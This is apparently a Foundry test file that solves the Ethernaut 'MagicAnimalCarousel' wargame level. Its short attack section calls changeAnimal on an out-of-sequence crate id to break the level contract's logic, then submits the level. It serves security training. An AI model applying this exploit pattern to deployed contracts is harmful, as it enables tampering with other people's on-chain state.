// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import "../src/MagicAnimalCarousel/MagicAnimalCarouselFactory.sol";
import "../src/Ethernaut.sol";

contract MagicAnimalCarouselTest is StdCheats, Test {
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testMagicAnimalCarouselHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        MagicAnimalCarouselFactory magicAnimalCarouselFactory = new MagicAnimalCarouselFactory();
        ethernaut.registerLevel(magicAnimalCarouselFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(magicAnimalCarouselFactory);
        MagicAnimalCarousel ethernautMagicAnimalCarousel = MagicAnimalCarousel(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        uint256 currentCrateId = ethernautMagicAnimalCarousel.currentCrateId();
        ethernautMagicAnimalCarousel.changeAnimal("aa", currentCrateId + 1);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
